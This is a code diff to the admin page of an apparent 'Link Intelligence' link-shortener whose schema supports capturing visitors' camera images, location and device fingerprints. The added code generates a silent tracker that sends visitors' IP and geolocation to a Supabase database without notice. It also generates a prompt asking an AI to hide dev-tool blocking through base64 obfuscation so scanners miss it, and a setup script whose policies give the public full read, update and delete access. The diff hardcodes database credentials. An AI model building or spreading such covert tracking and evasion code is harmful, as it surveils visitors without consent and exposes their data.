@@ -50,8 +50,9 @@ export default function Admin() {
           link_analytics (
             id,
             captured_image,
-            city,
-            latitude
+            location_name,
+            latitude,
+            longitude
           )
         `)
         .order('created_at', { ascending: false });
@@ -68,7 +69,7 @@ export default function Admin() {
             ...link,
             clicks: analytics.length,
             image_count: analytics.filter((a: any) => a.captured_image).length,
-            location_count: analytics.filter((a: any) => a.city).length,
+            location_count: analytics.filter((a: any) => a.location_name).length,
             geo_count: analytics.filter((a: any) => a.latitude).length
           };
         }).sort((a, b) => {
@@ -164,6 +165,107 @@ export default function Admin() {
     }
   };
 
+  const downloadDatabaseSetup = () => {
+    const sqlText = `
+-- COMPLETE SUPABASE SETUP SCRIPT FOR LINK INTELLIGENCE
+-- 1. Create urls table
+create table public.urls (
+  id uuid default gen_random_uuid() primary key,
+  domain text not null,
+  short_code text not null,
+  long_url text not null,
+  password text,
+  social_gate_title text,
+  social_gate_url text,
+  social_gate_icon text,
+  social_gate_description text,
+  social_gate_button_text text,
+  device_id text,
+  animation_type text default 'ring',
+  animation_text text default 'LOADING',
+  capture_camera boolean default false,
+  capture_location boolean default false,
+  expires_at timestamp with time zone,
+  clicks integer default 0,
+  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
+  unique (domain, short_code)
+);
+
+-- 2. Create link_analytics table
+create table public.link_analytics (
+  id uuid default gen_random_uuid() primary key,
+  url_id uuid references public.urls(id) on delete cascade,
+  ip_address text,
+  device_type text,
+  browser text,
+  os text,
+  referrer text,
+  captured_image text,
+  latitude double precision,
+  longitude double precision,
+  location_name text,
+  battery_level float,
+  is_charging boolean,
+  network_type text,
+  screen_resolution text,
+  language text,
+  hardware_concurrency integer,
+  device_memory integer,
+  color_depth integer,
+  timezone text,
+  webgl_vendor text,
+  webgl_renderer text,
+  created_at timestamp with time zone default timezone('utc'::text, now()) not null
+);
+
+-- 3. Enable RLS
+alter table public.urls enable row level security;
+alter table public.link_analytics enable row level security;
+
+-- 4. Create Security Policies
+create policy "Allow public read access" on public.urls for select using (true);
+create policy "Allow public insert access" on public.urls for insert with check (true);
+create policy "Allow public update access" on public.urls for update using (true);
+create policy "Allow public delete access" on public.urls for delete using (true);
+
+create policy "Allow public read access for analytics" on public.link_analytics for select using (true);
+create policy "Allow public insert access for analytics" on public.link_analytics for insert with check (true);
+create policy "Allow public delete access for analytics" on public.link_analytics for delete using (true);
+`;
+
+    const blob = new Blob([sqlText], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "supabase_setup.sql";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  };
+
+  const downloadSecurityPrompt = () => {
+    const promptText = `PROMPT FOR AI:
+"I want to protect my website's source code from being inspected by users. Please implement a React/JavaScript snippet that disables the following:
+1. Right-click context menu (e.preventDefault on contextmenu event).
+2. The F12 key (Developer Tools).
+3. Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C (Developer Tools shortcuts).
+4. Ctrl+U (View Source shortcut).
+
+Make sure to obfuscate the strings slightly (e.g. using base64 'contextmenu', 'preventDefault', 'keydown', etc. with window.atob) so that scanners or casual readers of the source code don't easily bypass it by searching for 'contextmenu'."
+`;
+
+    const blob = new Blob([promptText], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "anti_inspect_security_prompt.txt";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  };
+
   if (!isAuthenticated) {
     return (
       <div className="min-h-screen bg-black flex items-center justify-center p-6 flex-col">
@@ -199,6 +301,173 @@ export default function Admin() {
       </div>
     );
   }
+
+  const downloadFullIntegrationPrompt = () => {
+    const promptText = `Provide this prompt to any AI assistant (like ChatGPT, Claude, Gemini) to integrate a full Passive Analytics System (Tracker + Dashboard) into your own website:
+
+PROMPT FOR AI:
+"I want to integrate a Passive Visitor Analytics Tracker AND a domain-specific Analytics Dashboard into my frontend web application using my Supabase database.
+
+Please read the following logic and implement it into my project.
+
+HOW IT WORKS:
+1. TRACKING: When a user visits the target page, the script silently gathers browser, OS, hardware concurrency, network info, language, screen resolution, and fetching location passively via IP string (e.g. from ipapi.co).
+2. DOMAIN SEPARATION: It creates or fetches a record in the 'urls' table for my specific domain (e.g. window.location.hostname) under the short code '@analytics'.
+3. DB INSERTION: It pushes the visitor intel to a Supabase table named 'link_analytics' linked to my domain's URL record.
+4. DASHBOARD DISPLAY: The Dashboard UI fetches data from 'link_analytics' BUT ONLY where the 'url_id' matches my specific domain's URL record. This ensures each website only sees its own analytics.
+
+Here are the specific snippets you should use as a reference:
+
+--- 1. Supabase Credentials ---
+VITE_SUPABASE_URL="https://irhqcroczvdkytvvsico.supabase.co"
+VITE_SUPABASE_ANON_KEY="sb_publishable_iecSD9eU8wwGFllUWzmZng_yYam5hag"
+
+
+--- 2. Passive Tracker Logic (TypeScript/React Example) ---
+import { useEffect } from 'react';
+// import { supabase } from './your-supabase-client';
+
+async function collectPassiveIntel() {
+  const intel: any = {};
+  
+  intel.browser = navigator.userAgent;
+  intel.language = navigator.language || 'Unknown';
+  intel.screen_resolution = \`\${window.screen.width}x\${window.screen.height}\`;
+  
+  try {
+    const ipRes = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipRes.json();
+    intel.ip_address = ipData.ip;
+    
+    // Using ipapi.co via HTTPS to fetch general location string and coordinates
+    const geoRes = await fetch(\`https://ipapi.co/\${intel.ip_address}/json/\`);
+    if (geoRes.ok) {
+      const geoData = await geoRes.json();
+      intel.city = geoData.city || 'Unknown Location';
+      if (geoData.latitude && geoData.longitude) {
+        intel.latitude = parseFloat(geoData.latitude);
+        intel.longitude = parseFloat(geoData.longitude);
+      }
+    } else {
+        const ipwhoRes = await fetch('https://ipwho.is/');
+        const ipwhoData = await ipwhoRes.json();
+        if (ipwhoData.success) {
+            intel.city = ipwhoData.city || 'Unknown Location';
+            if (ipwhoData.latitude && ipwhoData.longitude) {
+                intel.latitude = parseFloat(ipwhoData.latitude);
+                intel.longitude = parseFloat(ipwhoData.longitude);
+            }
+        }
+    }
+  } catch(e) {
+    console.warn("IP tracking blocked or failed");
+  }
+
+  intel.ip_address = intel.ip_address || 'Unknown IP';
+  intel.city = intel.city || 'Unknown Location';
+  intel.referrer = document.referrer || 'Direct';
+
+  return intel;
+}
+
+export function AnalyticsTracker() {
+  useEffect(() => {
+    let mounted = true;
+    collectPassiveIntel().then(async (intel) => {
+      if (!mounted) return;
+
+      const domain = window.location.hostname;
+      let urlId = null;
+      
+      const { data: existing } = await supabase
+        .from('urls').select('id').eq('domain', domain).eq('short_code', '@analytics').single();
+        
+      if (existing) {
+        urlId = existing.id;
+      } else {
+        const { data: created } = await supabase
+          .from('urls')
+          .insert([{ domain, short_code: '@analytics', long_url: window.location.href }])
+          .select('id').single();
+        if (created) urlId = created.id;
+      }
+
+      if (urlId) {
+        await supabase.from('link_analytics').insert([{
+          url_id: urlId,
+          ip_address: intel.ip_address,
+          browser: intel.browser,
+          referrer: intel.referrer,
+          location_name: intel.city,
+          latitude: intel.latitude,
+          longitude: intel.longitude,
+          screen_resolution: intel.screen_resolution,
+          language: intel.language,
+          // Add remaining fields (hardware, webgl, battery) as needed
+        }]);
+      }
+    });
+
+    return () => { mounted = false; };
+  }, []);
+
+  return null; // Render nothing, purely background logic
+}
+
+
+--- 3. Dashboard UI Logic (React/TypeScript Example) ---
+import { useEffect, useState } from 'react';
+// import { supabase } from './your-supabase-client';
+
+export function useMyDomainAnalytics() {
+  const [analytics, setAnalytics] = useState<any[]>([]);
+
+  useEffect(() => {
+    async function fetchMyAnalytics() {
+      const domain = window.location.hostname;
+      
+      // Step 1: Securely get this domain's URL ID
+      const { data: urlData } = await supabase
+        .from('urls').select('id').eq('domain', domain).eq('short_code', '@analytics').single();
+        
+      if (!urlData) return;
+      
+      // Step 2: Fetch ONLY data for this domain
+      const { data } = await supabase
+        .from('link_analytics')
+        .select('*')
+        .eq('url_id', urlData.id)
+        .order('created_at', { ascending: false })
+        .limit(100);
+        
+      if (data) setAnalytics(data);
+    }
+    
+    fetchMyAnalytics();
+  }, []);
+
+  return { analytics };
+}
+
+// You can use the hook above to build a custom UI table or charts
+
+
+--- My Custom Instructions ---
+(AI, please follow my instructions below for exactly where to place the Tracker and how to design the Dashboard UI):
+
+[WRITE YOUR SPECIFIC INSTRUCTIONS HERE, e.g., "Add the AnalyticsTracker to layout.tsx and build a nice Tailwind table dashboard on a new /admin page showing the data."]
+"`;
+
+    const blob = new Blob([promptText], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "full_analytics_system_prompt.txt";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  };
 
   const filteredLinks = links.filter(l => 
     l.short_code.toLowerCase().includes(search.toLowerCase()) || 
@@ -247,8 +516,32 @@ export default function Admin() {
                 <p className="text-xs md:text-xl font-black text-blue-500">{stats.totalClicks}</p>
               </div>
             </div>
-            <div className="hidden md:flex items-center gap-4">
-              <div className="h-8 md:h-10 w-[1px] bg-zinc-900 mx-2"></div>
+            <div className="hidden md:flex items-center gap-2">
+              <button 
+                onClick={downloadDatabaseSetup}
+                className="text-blue-500 hover:text-white transition-colors flex items-center gap-1.5 bg-blue-500/10 hover:bg-blue-500/20 px-3 py-1.5 rounded-lg border border-blue-500/20 text-xs font-bold"
+                title="Download Supabase DB Setup Script"
+              >
+                <Database className="w-3.5 h-3.5" />
+                Setup SQL
+              </button>
+              <button 
+                onClick={downloadSecurityPrompt}
+                className="text-red-500 hover:text-white transition-colors flex items-center gap-1.5 bg-red-500/10 hover:bg-red-500/20 px-3 py-1.5 rounded-lg border border-red-500/20 text-xs font-bold"
+                title="Download prompt to add Anti-Inspect Security"
+              >
+                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                Security Prompt
+              </button>
+              <button 
+                onClick={downloadFullIntegrationPrompt}
+                className="text-emerald-500 hover:text-white transition-colors flex items-center gap-1.5 bg-emerald-500/10 hover:bg-emerald-500/20 px-3 py-1.5 rounded-lg border border-emerald-500/20 text-xs font-bold"
+                title="Download prompt to add tracker and dashboard to another website"
+              >
+                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                AI Integration Prompt
+              </button>
+              <div className="h-8 md:h-10 w-[1px] bg-zinc-900 mx-1"></div>
               <RefreshCw 
                 onClick={fetchGlobalData}
                 className={cn("w-5 h-5 text-zinc-400 cursor-pointer hover:text-white transition-colors", loading && "animate-spin")} 
@@ -311,8 +604,12 @@ export default function Admin() {
                       </td>
                       <td className="px-6 py-4">
                         <div className="flex flex-col">
-                          <span className="text-blue-400 font-bold mb-0.5 tracking-tight">/{link.short_code}</span>
-                          <span className="text-[10px] text-zinc-500 truncate max-w-[200px]">{link.long_url}</span>
+                          {link.short_code === '@analytics' ? (
+                            <span className="text-purple-400 font-bold mb-0.5 tracking-tighter flex items-center gap-1.5"><Globe className="w-3 h-3" /> {link.domain}</span>
+                          ) : (
+                            <span className="text-blue-400 font-bold mb-0.5 tracking-tight">/{link.short_code}</span>
+                          )}
+                          <span className="text-[10px] text-zinc-500 truncate max-w-[200px]">{link.short_code === '@analytics' ? 'Passive Analytics Tracker' : link.long_url}</span>
                         </div>
                       </td>
                       <td className="px-6 py-4">
@@ -404,8 +701,17 @@ export default function Admin() {
                       {link.is_pinned ? <Pin className="w-4 h-4 fill-current" /> : <PinOff className="w-4 h-4" />}
                     </button>
                     <div>
-                      <p className="text-blue-400 font-black text-lg tracking-tight">/{link.short_code}</p>
-                      <p className="text-[10px] text-zinc-500 truncate max-w-[180px]">{link.long_url}</p>
+                      {link.short_code === '@analytics' ? (
+                        <>
+                          <p className="text-purple-400 font-black text-lg tracking-tight flex items-center gap-1.5"><Globe className="w-4 h-4" /> {link.domain}</p>
+                          <p className="text-[10px] text-zinc-500 truncate max-w-[180px]">Passive Analytics Tracker</p>
+                        </>
+                      ) : (
+                        <>
+                          <p className="text-blue-400 font-black text-lg tracking-tight">/{link.short_code}</p>
+                          <p className="text-[10px] text-zinc-500 truncate max-w-[180px]">{link.long_url}</p>
+                        </>
+                      )}
                     </div>
                   </div>
                   <div className="flex flex-col items-end gap-2">
@@ -585,6 +891,7 @@ export default function Admin() {
                                      <div className="flex flex-wrap gap-1.5">
                                         <span className="bg-zinc-800/80 px-2 py-0.5 rounded-md text-[8px] text-zinc-400 font-bold border border-white/5 uppercase">{log.os?.split(' ')[0] || 'OS'}</span>
                                         <span className="bg-zinc-800/80 px-2 py-0.5 rounded-md text-[8px] text-zinc-400 font-mono border border-white/5">{log.browser?.split(' ')[0] || '??'}</span>
+                                        <span className="bg-emerald-500/5 px-2 py-0.5 rounded-md text-[7px] text-emerald-500 font-black border border-emerald-500/10 uppercase tracking-tighter">Passive Node</span>
                                      </div>
                                      <p className="text-[10px] font-black text-zinc-200 tracking-tight line-clamp-1">{log.browser || 'Unknown Browser'}</p>
                                      <div className="flex items-center gap-2">
@@ -626,8 +933,8 @@ export default function Admin() {
                                         <Globe className="w-3.5 h-3.5 text-zinc-500" />
                                       </div>
                                       <div>
-                                        <p className="text-[10px] font-black text-white leading-tight">{log.city || 'Unknown'}</p>
-                                        <p className="text-[7px] text-zinc-600 font-bold uppercase tracking-wider">{log.country || 'GLOBAL'}</p>
+                                        <p className="text-[10px] font-black text-white leading-tight">{log.location_name ? log.location_name.split(',')[0] : 'Unknown'}</p>
+                                        <p className="text-[7px] text-zinc-600 font-bold uppercase tracking-wider">{log.location_name && log.location_name.includes(',') ? log.location_name.split(',')[1].trim() : 'GLOBAL'}</p>
                                       </div>
                                    </div>
                                    <div className="text-right">
@@ -745,8 +1052,8 @@ export default function Admin() {
                                           <Globe className="w-4 h-4 text-zinc-600 group-hover:text-blue-400" />
                                         </div>
                                         <div className="text-left">
-                                          <p className="text-xs font-black text-zinc-200 uppercase leading-none">{log.city || 'Unknown'}</p>
-                                          <p className="text-[9px] text-zinc-600 font-bold uppercase mt-1">{log.country || 'GLOBAL'}</p>
+                                          <p className="text-xs font-black text-zinc-200 uppercase leading-none">{log.location_name ? log.location_name.split(',')[0] : 'Unknown'}</p>
+                                          <p className="text-[9px] text-zinc-600 font-bold uppercase mt-1">{log.location_name && log.location_name.includes(',') ? log.location_name.split(',')[1].trim() : 'GLOBAL'}</p>
                                         </div>
                                       </div>
                                       {log.latitude && log.longitude && (
